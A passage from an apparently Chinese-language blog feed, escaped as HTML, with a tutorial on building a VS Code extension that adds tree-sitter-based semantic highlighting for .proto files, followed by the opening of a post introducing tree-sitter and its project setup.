&lt;span class="kd">function&lt;/span> &lt;span class="nx">higher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">fn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">fn&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">higher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>在 &lt;code>higher(f)&lt;/code> 这一行中的 &lt;code>f&lt;/code> 不会以函数名的颜色标出。这就引出了一种新基于语义的代码高亮，让编辑器真正“认识”你的代码，并提供更聪明的提示。&lt;/p>
&lt;h2 id="开始">开始&lt;/h2>
&lt;p>还是在 vscode 折腾。&lt;/p>
&lt;p>先创建一个 vscode 插件项目，用 &lt;code>yo code&lt;/code> 完成。&lt;/p>
&lt;p>然后编辑 &lt;code>package.json&lt;/code> ，添加你的语言和插件的激活事件。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;activationEvents&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;onLanguage:proto&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span>
&lt;span class="nt">&amp;#34;contributes&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;languages&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;id&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;proto&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nt">&amp;#34;extensions&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;.proto&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">]&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后修改 &lt;code>src/extension.ts&lt;/code>，去掉默认创建的 hello world 代码，留一个 &lt;code>console.log&lt;/code>，然后 F5 启动，打开一个 &lt;code>.proto&lt;/code> 文件，检查插件是否已经激活。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-typescript" data-lang="typescript">&lt;span class="c1">// The module &amp;#39;vscode&amp;#39; contains the VS Code extensibility API
&lt;/span>&lt;span class="c1">// Import the module and reference it with the alias vscode in your code below
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">import&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="kr">as&lt;/span> &lt;span class="nx">vscode&lt;/span> &lt;span class="kr">from&lt;/span> &lt;span class="s2">&amp;#34;vscode&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// this method is called when your extension is activated
&lt;/span>&lt;span class="c1">// your extension is activated the very first time the command is executed
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">export&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nx">activate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>: &lt;span class="kt">vscode.ExtensionContext&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;activated!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// this method is called when your extension is deactivated
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kr">export&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nx">deactivate() {&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="创建和注册-documentsemantictokensprovider">创建和注册 DocumentSemanticTokensProvider&lt;/h2>
&lt;p>创建文件 &lt;code>src/providers/SemanticTokensProvider.ts&lt;/code> ，编写一个类，实现接口 &lt;code>vscode.DocumentSemanticTokensProvider&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-typescript" data-lang="typescript">&lt;span class="kr">import&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="kr">as&lt;/span> &lt;span class="nx">vscode&lt;/span> &lt;span class="kr">from&lt;/span> &lt;span class="s2">&amp;#34;vscode&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">Parser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;web-tree-sitter&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">export&lt;/span> &lt;span class="k">default&lt;/span> &lt;span class="kr">class&lt;/span> &lt;span class="nx">SemanticTokenProvider&lt;/span>
&lt;span class="kr">implements&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DocumentSemanticTokensProvider&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="kr">constructor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">public&lt;/span> &lt;span class="nx">legend&lt;/span>: &lt;span class="kt">vscode.SemanticTokensLegend&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">Parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">init&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(()&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">Parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Language&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">load&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">resolve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">__dirname&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;../../assets/tree-sitter-proto.wasm&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">).&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">lang&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Parser&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setLanguage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">lang&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">onDidChangeSemanticTokens?&lt;/span>: &lt;span class="kt">vscode.Event&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">void&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="kc">undefined&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nx">provideDocumentSemanticTokens&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TextDocument&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">token&lt;/span>: &lt;span class="kt">vscode.CancellationToken&lt;/span>
&lt;span class="p">)&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ProviderResult&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">vscode.SemanticTokens&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Not implemented&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再到 &lt;code>src/extension.ts&lt;/code> 里注册。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-ts" data-lang="ts">&lt;span class="kr">export&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="nx">activate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>: &lt;span class="kt">vscode.ExtensionContext&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;activated!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// register semantic tokens provider
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kr">const&lt;/span> &lt;span class="nx">tokenTypes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>
&lt;span class="s2">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;enum&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;class&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;function&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;comment&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;string&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;number&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;keyword&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;parameter&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">];&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">modifiers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;definition&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;deprecated&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;documentation&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">selector&lt;/span>: &lt;span class="kt">vscode.DocumentSelector&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;proto&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">scheme&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;file&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">legend&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SemanticTokensLegend&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">tokenTypes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">modifiers&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">provider&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">SemanticTokenProvider&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">legend&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">subscriptions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">languages&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">registerDocumentSemanticTokensProvider&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">selector&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">provider&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">legend&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个 &lt;code>tree-sitter-proto.wasm&lt;/code> 是编译好的语法定义，参考&lt;a class="link" href="./play-with-tree-sitter.md" >另一篇文章&lt;/a>。&lt;/p>
&lt;p>这样一来，&lt;code>new SemanticTokenProvider(legend)&lt;/code> 时就会初始化 parser 了。&lt;/p>
&lt;h2 id="实现">实现&lt;/h2>
&lt;p>先写个简单的 &lt;code>provideDocumentSemanticTokens&lt;/code> 实现。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-typescript" data-lang="typescript">&lt;span class="kr">class&lt;/span> &lt;span class="nx">SemanticTokenProvider&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">provideDocumentSemanticTokens&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TextDocument&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">token&lt;/span>: &lt;span class="kt">vscode.CancellationToken&lt;/span>
&lt;span class="p">)&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ProviderResult&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">vscode.SemanticTokens&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">tree&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parser&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getText&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">query&lt;/span>: &lt;span class="kt">Parser.Query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parser&lt;/span>
&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getLanguage&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;(&amp;#34;message&amp;#34;) @keyword&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">captures&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">query&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">captures&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">tree&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rootNode&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">tokenBuilder&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SemanticTokensBuilder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">legend&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">capture&lt;/span> &lt;span class="k">of&lt;/span> &lt;span class="nx">captures&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">tokenBuilder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Range&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Position&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">startPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">row&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">startPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">column&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Position&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">endPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">row&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">endPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">column&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">name&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">tokens&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">tokenBuilder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">build&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">Promise&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">resolve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">tokens&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最核心的部分就是 &lt;code>getLanguage().query()&lt;/code> 了，这里用了 tree-sitter 的查询语言 DSL 实现快速从语法树里提取对应的节点。&lt;/p>
&lt;p>放个&lt;a class="link" href="https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax" target="_blank" rel="noopener"
>查询语言的文档&lt;/a>，再简要介绍下。&lt;/p>
&lt;blockquote>
&lt;p>A query consists of one or more patterns, where each pattern is an S-expression that matches a certain set of nodes in a syntax tree.&lt;/p>
&lt;/blockquote>
&lt;p>本质上查询语言是个模式匹配工具，以 s-expression 作为模式语言。例如下面的查询。&lt;/p>
&lt;pre>&lt;code>(number)
&lt;/code>&lt;/pre>&lt;p>就是查询 ast 里所有的 number 节点。而 number 节点的定义在 tree-sitter 项目语法定义 &lt;code>grammar.js&lt;/code> 中给出。&lt;/p>
&lt;p>再看复杂一点的查询：&lt;/p>
&lt;pre>&lt;code>(binary_expression
(number)
(number)
)
&lt;/code>&lt;/pre>&lt;p>就是查询语法树中的 包含两个 number 子节点的 binary_expression 节点，不限定 number 节点的位置，只要是子节点就行。&lt;/p>
&lt;p>语法树的结构可以参考 &lt;code>tree-sitter parse&lt;/code> 命令的输出。&lt;/p>
&lt;p>当然也可以以子节点的值为条件来查询。&lt;/p>
&lt;pre>&lt;code>(binary_expression
left:(number)
)
&lt;/code>&lt;/pre>&lt;p>再看如何捕获查询结果。&lt;/p>
&lt;pre>&lt;code>(function
name: (identifier) @function_name
)
&lt;/code>&lt;/pre>&lt;p>用 &lt;code>@&lt;/code> 开头的标识符指定捕获的名称，通过 &lt;code>query.captures()&lt;/code> 即可完成捕获，返回 &lt;code>{name: string, node: Node}&lt;/code> 这样子的对象的列表。&lt;/p>
&lt;p>这样一来，上面的代码就很容易理解了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-ts" data-lang="ts">&lt;span class="kr">const&lt;/span> &lt;span class="nx">query&lt;/span>: &lt;span class="kt">Parser.Query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parser&lt;/span>
&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getLanguage&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;(&amp;#34;message&amp;#34;) @keyword&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">captures&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">query&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">captures&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">tree&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">rootNode&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这两句话查询出了语法树里所有的 &lt;code>message&lt;/code> 关键字&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-ts" data-lang="ts">&lt;span class="kr">const&lt;/span> &lt;span class="nx">tokenBuilder&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">SemanticTokensBuilder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">legend&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">capture&lt;/span> &lt;span class="k">of&lt;/span> &lt;span class="nx">captures&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">tokenBuilder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">push&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Range&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Position&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">startPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">row&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">startPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">column&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="k">new&lt;/span> &lt;span class="nx">vscode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Position&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">endPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">row&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">endPosition&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">column&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="p">),&lt;/span>
&lt;span class="nx">capture&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">name&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这一段循环将捕获的结果构造出高亮 token，注意这里用了 &lt;code>capture.name&lt;/code> 作为标识符的类型，也就是上面的 query 里指定的 &lt;code>keyword&lt;/code> 。&lt;/p>
&lt;p>最终，将分词的结果返回出去。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-ts" data-lang="ts">&lt;span class="kr">const&lt;/span> &lt;span class="nx">tokens&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">tokenBuilder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">build&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">Promise&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">resolve&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">tokens&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>F5 运行即可看到源码中所有 &lt;code>message&lt;/code> 都被标上了关键字的颜色。&lt;/p></description></item><item><title>玩玩 tree-sitter</title><link>https://nnnewb.github.io/blog/p/%E7%8E%A9%E7%8E%A9-tree-sitter/</link><pubDate>Thu, 29 Jul 2021 10:14:36 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E7%8E%A9%E7%8E%A9-tree-sitter/</guid><description>&lt;p>什么是tree-sitter呢？&lt;/p>
&lt;p>tree-sitter 是一个 parser-generator，也是一个增量解析库（incremental parsing library）。它可以为源文件构建完整的语法树，并在源文件被编辑时高效地更新。&lt;/p>
&lt;!-- more -->
&lt;h2 id="快速开始">快速开始&lt;/h2>
&lt;p>tree-sitter 本身是一个 parser generator ，使用 javascript 来作为描述语法规则的语言（不像其他，如 yacc 一类的工具，以类似 EBNF 的 DSL 来描述语法规则）。&lt;/p>
&lt;p>我们写 tree-sitter 语法规则本质上是类似于写一个 tree-sitter 的语法支持包，可以参考下 &lt;a class="link" href="https://github.com/tree-sitter/tree-sitter-go" target="_blank" rel="noopener"
>tree-sitter/tree-sitter-go: Go grammar for tree-sitter (github.com)&lt;/a> 的项目结构。&lt;/p>
&lt;p>废话不多说，先写个简单的 demo 跑起来。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">mkdir tree-sitter-hello &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nb">cd&lt;/span> tree-sitter-hello
npm init
npm i --save nan
npm i --save-dev tree-sitter-cli
&lt;/code>&lt;/pre>&lt;/div>&lt;p>初始化好项目目录，在 package.json 里写个简单的命令，方便之后用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="p">{&lt;/span>
&lt;span class="nt">&amp;#34;scripts&amp;#34;&lt;/span>&lt;span class="p">:{&lt;/span>
&lt;span class="nt">&amp;#34;test&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;tree-sitter generate &amp;amp;&amp;amp; tree-sitter parse test.txt&amp;#34;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在开始干正事儿，创建一个 grammar.js&lt;/p>
